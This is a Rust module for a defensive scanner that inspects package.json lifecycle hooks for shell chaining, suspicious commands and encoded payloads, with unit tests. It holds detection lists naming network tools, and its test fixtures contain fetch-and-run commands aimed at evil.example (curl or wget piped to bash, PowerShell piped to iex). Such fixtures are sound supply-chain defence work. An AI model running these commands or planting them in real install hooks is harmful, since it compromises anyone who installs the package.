//! Node.js `package.json` lifecycle hook scanner.
//!
//! Parses `package.json` files and inspects lifecycle script hooks
//! (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`)
//! for shell metacharacters, suspicious commands, and encoded payloads.
//!
//! **Security invariant:** This module NEVER executes the analyzed scripts.

use std::path::Path;

use serde_json::Value;

use crate::findings::{Finding, FindingKind, ScanReport, Severity};

/// Lifecycle hooks that execute automatically during package installation.
/// These are the highest-risk hooks because they run without user interaction.
const LIFECYCLE_HOOKS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "prepack",
    "postpack",
];

/// Shell metacharacters that indicate command chaining or injection.
const SHELL_METACHARACTERS: &[&str] = &[
    "&&",  // command chaining
    "||",  // conditional chaining
    ";",   // command separator
    "$(",  // command substitution
    "`",   // backtick command substitution
    "|",   // pipe
    ">>",  // append redirect
    "2>&1", // stderr redirect
];

/// Suspicious commands commonly used in malicious scripts.
const SUSPICIOUS_COMMANDS: &[&str] = &[
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "bash -c",
    "sh -c",
    "cmd /c",
    "powershell",
    "pwsh",
    "eval",
    "exec",
    "python -c",
    "python3 -c",
    "node -e",
    "ruby -e",
    "perl -e",
];

/// Patterns indicating encoded or obfuscated payloads.
const OBFUSCATION_PATTERNS: &[&str] = &[
    "base64",
    "btoa",
    "atob",
    "Buffer.from",
    "\\x",        // hex-encoded bytes
    "\\u00",      // unicode escapes
    "fromCharCode",
    "decodeURIComponent",
    "%2f",        // URL-encoded forward slash
    "%2F",
];

/// Scan a `package.json` file for suspicious lifecycle hooks and patterns.
///
/// # Arguments
/// * `path` — Path to the `package.json` file
/// * `content` — The raw JSON content of the file
///
/// # Returns
/// A `ScanReport` containing all findings from this file.
pub fn scan_package_json(path: &Path, content: &str) -> ScanReport {
    let mut report = ScanReport::new();
    report.files_scanned = 1;

    let parsed: Value = match serde_json::from_str(content) {
        Ok(v) => v,
        Err(e) => {
            report.findings.push(Finding::new(
                path.to_path_buf(),
                None,
                Severity::Info,
                FindingKind::LifecycleHook,
                format!("Failed to parse package.json: {e}"),
            ));
            return report;
        }
    };

    // Extract the "scripts" object
    let scripts = match parsed.get("scripts").and_then(|s| s.as_object()) {
        Some(s) => s,
        None => return report, // No scripts section — nothing to scan
    };

    for (hook_name, hook_value) in scripts {
        let script = match hook_value.as_str() {
            Some(s) => s,
            None => continue,
        };

        // Check if this is a lifecycle hook
        let is_lifecycle = LIFECYCLE_HOOKS
            .iter()
            .any(|h| h.eq_ignore_ascii_case(hook_name));

        if is_lifecycle {
            report.findings.push(
                Finding::new(
                    path.to_path_buf(),
                    None,
                    Severity::Info,
                    FindingKind::LifecycleHook,
                    format!(
                        "Lifecycle hook detected: \"{}\" — this script runs automatically during npm install",
                        hook_name
                    ),
                )
                .with_snippet(format!("\"{}\": \"{}\"", hook_name, truncate(script, 80))),
            );

            // Check for shell metacharacters (elevated severity for lifecycle hooks)
            check_shell_metacharacters(path, hook_name, script, &mut report, true);

            // Check for suspicious commands
            check_suspicious_commands(path, hook_name, script, &mut report, true);

            // Check for obfuscation patterns
            check_obfuscation(path, hook_name, script, &mut report);
        } else {
            // Non-lifecycle scripts — lower severity but still worth checking
            check_shell_metacharacters(path, hook_name, script, &mut report, false);
            check_suspicious_commands(path, hook_name, script, &mut report, false);
            check_obfuscation(path, hook_name, script, &mut report);
        }
    }

    report
}

/// Check a script for shell metacharacters.
fn check_shell_metacharacters(
    path: &Path,
    hook_name: &str,
    script: &str,
    report: &mut ScanReport,
    is_lifecycle: bool,
) {
    for meta in SHELL_METACHARACTERS {
        if script.contains(meta) {
            let severity = if is_lifecycle {
                Severity::Warn
            } else {
                Severity::Info
            };

            report.findings.push(
                Finding::new(
                    path.to_path_buf(),
                    None,
                    severity,
                    FindingKind::ShellMetacharacters,
                    format!(
                        "Shell metacharacter {:?} found in script \"{}\": {}",
                        meta,
                        hook_name,
                        if is_lifecycle {
                            "lifecycle hooks with command chaining are high-risk"
                        } else {
                            "command chaining detected"
                        }
                    ),
                )
                .with_snippet(format!("\"{}\": \"{}\"", hook_name, truncate(script, 80))),
            );
            // Only report the first metacharacter match per script to avoid noise
            break;
        }
    }
}

/// Check a script for suspicious commands.
fn check_suspicious_commands(
    path: &Path,
    hook_name: &str,
    script: &str,
    report: &mut ScanReport,
    is_lifecycle: bool,
) {
    let lower = script.to_lowercase();

    for cmd in SUSPICIOUS_COMMANDS {
        if lower.contains(&cmd.to_lowercase()) {
            let severity = if is_lifecycle {
                Severity::Critical
            } else {
                Severity::Warn
            };

            report.findings.push(
                Finding::new(
                    path.to_path_buf(),
                    None,
                    severity,
                    FindingKind::SuspiciousCommand,
                    format!(
                        "Suspicious command {:?} found in {} script \"{}\"{}",
                        cmd,
                        if is_lifecycle { "lifecycle" } else { "" },
                        hook_name,
                        if is_lifecycle {
                            " — this command will execute automatically during npm install"
                        } else {
                            ""
                        }
                    ),
                )
                .with_snippet(format!("\"{}\": \"{}\"", hook_name, truncate(script, 80))),
            );
        }
    }
}

/// Check a script for obfuscation/encoding patterns.
fn check_obfuscation(
    path: &Path,
    hook_name: &str,
    script: &str,
    report: &mut ScanReport,
) {
    for pattern in OBFUSCATION_PATTERNS {
        if script.contains(pattern) {
            report.findings.push(
                Finding::new(
                    path.to_path_buf(),
                    None,
                    Severity::Critical,
                    FindingKind::EncodedPayload,
                    format!(
                        "Encoded/obfuscated payload pattern {:?} found in script \"{}\" — this may indicate hidden malicious code",
                        pattern, hook_name
                    ),
                )
                .with_snippet(format!("\"{}\": \"{}\"", hook_name, truncate(script, 80))),
            );
            // Only report first obfuscation pattern per script
            break;
        }
    }
}

/// Truncate a string to max length, appending "..." if truncated.
fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn scan(json: &str) -> ScanReport {
        scan_package_json(&PathBuf::from("package.json"), json)
    }

    #[test]
    fn test_detect_postinstall_hook() {
        let report = scan(r#"{
            "name": "evil-package",
            "scripts": {
                "postinstall": "echo hello"
            }
        }"#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::LifecycleHook));
    }

    #[test]
    fn test_detect_curl_in_postinstall() {
        let report = scan(r#"{
            "name": "evil-package",
            "scripts": {
                "postinstall": "curl https://evil.example/payload.sh | bash"
            }
        }"#);
        assert!(report.has_critical());
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SuspiciousCommand));
    }

    #[test]
    fn test_detect_shell_metacharacters() {
        let report = scan(r#"{
            "name": "chained-package",
            "scripts": {
                "postinstall": "npm run build && curl https://evil.example/steal"
            }
        }"#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::ShellMetacharacters));
    }

    #[test]
    fn test_detect_base64_obfuscation() {
        let report = scan(r#"{
            "name": "obfuscated-package",
            "scripts": {
                "postinstall": "echo aGVsbG8= | base64 --decode | bash"
            }
        }"#);
        assert!(report.has_critical());
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::EncodedPayload));
    }

    #[test]
    fn test_detect_node_eval() {
        let report = scan(r#"{
            "name": "eval-package",
            "scripts": {
                "preinstall": "node -e \"require('child_process').exec('whoami')\""
            }
        }"#);
        assert!(report.has_critical());
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SuspiciousCommand));
    }

    #[test]
    fn test_benign_package_json() {
        let report = scan(r#"{
            "name": "safe-package",
            "scripts": {
                "build": "tsc",
                "test": "jest",
                "start": "node index.js"
            }
        }"#);
        // No lifecycle hooks, no suspicious commands
        assert!(!report.has_critical());
        assert!(!report.has_warnings());
    }

    #[test]
    fn test_no_scripts_section() {
        let report = scan(r#"{
            "name": "minimal-package",
            "version": "1.0.0"
        }"#);
        assert!(report.findings.is_empty());
    }

    #[test]
    fn test_wget_in_install() {
        let report = scan(r#"{
            "name": "wget-package",
            "scripts": {
                "install": "wget https://evil.example/malware -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
            }
        }"#);
        assert!(report.has_critical());
    }

    #[test]
    fn test_powershell_in_postinstall() {
        let report = scan(r#"{
            "name": "ps-package",
            "scripts": {
                "postinstall": "powershell -Command \"Invoke-WebRequest https://evil.example/payload.ps1 | iex\""
            }
        }"#);
        assert!(report.has_critical());
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SuspiciousCommand));
    }
}
